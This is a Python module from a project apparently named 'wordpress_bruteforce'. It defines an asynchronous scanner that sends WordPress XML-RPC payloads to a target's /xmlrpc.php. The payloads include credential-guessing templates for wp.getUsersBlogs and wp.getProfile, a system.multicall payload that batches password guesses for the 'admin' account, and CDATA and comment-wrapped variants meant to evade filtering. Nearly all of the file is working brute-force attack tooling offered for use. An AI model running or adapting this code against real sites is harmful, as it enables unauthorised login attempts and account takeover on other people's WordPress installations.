# wordpress_bruteforce/modules/xmlrpc.py
from aiohttp import ClientSession
import asyncio
import random


class XMLRPCScanner:
    """Advanced XML-RPC scanner with payload variations"""

    # modules/xmlrpc.py
    PAYLOADS = [
        # Authentication probes
        """<?xml version="1.0"?>
    <methodCall>
        <methodName>wp.getUsersBlogs</methodName>
        <params>
            <param><value><string>{username}</string></value></param>
            <param><value><string>{password}</string></value></param>
        </params>
    </methodCall>""",
        # System methods
        """<?xml version="1.0" encoding="UTF-8"?>
    <methodCall>
      <methodName>system.listMethods</methodName>
      <params/>
    </methodCall>""",
        # Multi-call vectors
        """<methodCall>
        <methodName>system.multicall</methodName>
        <params>
            <param>
                <value>
                    <array>
                        <data>
                            <value>
                                <struct>
                                    <member>
                                        <name>methodName</name>
                                        <value><string>wp.getUsersBlogs</string></value>
                                    </member>
                                    <member>
                                        <name>params</name>
                                        <value>
                                            <array>
                                                <data>
                                                    <value><string>admin</string></value>
                                                    <value><string>{password}</string></value>
                                                </data>
                                            </array>
                                        </value>
                                    </member>
                                </struct>
                            </value>
                        </data>
                    </array>
                </value>
            </param>
        </params>
    </methodCall>""",
        # Legacy methods
        """<methodCall>
        <methodName>metaWeblog.getUsersBlogs</methodName>
        <params>
            <param><value><string>admin</string></value></param>
            <param><value><string>{password}</string></value></param>
        </params>
    </methodCall>""",
        # Invalid method probe
        """<methodCall>
        <methodName>invalid.method</methodName>
        <params>
            <param><value><string>test</string></value></param>
        </params>
    </methodCall>""",
        # Comment injection
        """<?xml version="1.0"?>
    <!-- This is a decoy comment -->
    <methodCall>
        <methodName>wp.getProfile</methodName>
        <params>
            <param><value><string>{username}</string></value></param>
            <param><value><string>{password}</string></value></param>
        </params>
    </methodCall>""",
        # CDATA wrapped
        """<methodCall>
        <methodName><![CDATA[wp.getUsersBlogs]]></methodName>
        <params>
            <param><value><string><![CDATA[{username}]]></string></value></param>
            <param><value><string><![CDATA[{password}]]></string></value></param>
        </params>
    </methodCall>""",
        # Parameter order variation
        """<methodCall>
        <methodName>wp.getUsersBlogs</methodName>
        <params>
            <param><value><string>{password}</string></value></param>
            <param><value><string>{username}</string></value></param>
        </params>
    </methodCall>""",
        # Empty parameter attack
        """<methodCall>
        <methodName>wp.getUsersBlogs</methodName>
        <params>
            <param><value><string/></value></param>
            <param><value><string/></value></param>
        </params>
    </methodCall>""",
        # Numeric parameter test
        """<methodCall>
        <methodName>wp.getUsersBlogs</methodName>
        <params>
            <param><value><int>1</int></value></param>
            <param><value><int>2</int></value></param>
        </params>
    </methodCall>""",
    ]

    async def check_xmlrpc(self, url):
        """Check XML-RPC with randomized payloads"""
        tasks = [
            self._try_endpoint(url, random.choice(self.PAYLOADS)),
            self._check_rsd(url),
            self._check_pingback(url),
        ]
        results = await asyncio.gather(*tasks)
        return any(results)

    async def _try_endpoint(self, url, payload):
        """Test XML-RPC endpoint with random payload"""
        try:
            async with ClientSession() as session:
                async with session.post(f"{url}/xmlrpc.php", data=payload) as resp:
                    return resp.status == 200 and "methodResponse" in await resp.text()
        except:
            return False

    async def _check_rsd(self, url):
        """Check RSD discovery"""
        try:
            async with ClientSession() as session:
                async with session.get(f"{url}/rsd.xml") as resp:
                    return "xmlrpc" in (await resp.text()).lower()
        except:
            return False

    async def _check_pingback(self, url):
        """Check pingback support"""
        try:
            async with ClientSession() as session:
                payload = random.choice(self.PAYLOADS)
                async with session.post(f"{url}/xmlrpc.php", data=payload) as resp:
                    return "Pingback" in await resp.text()
        except:
            return False
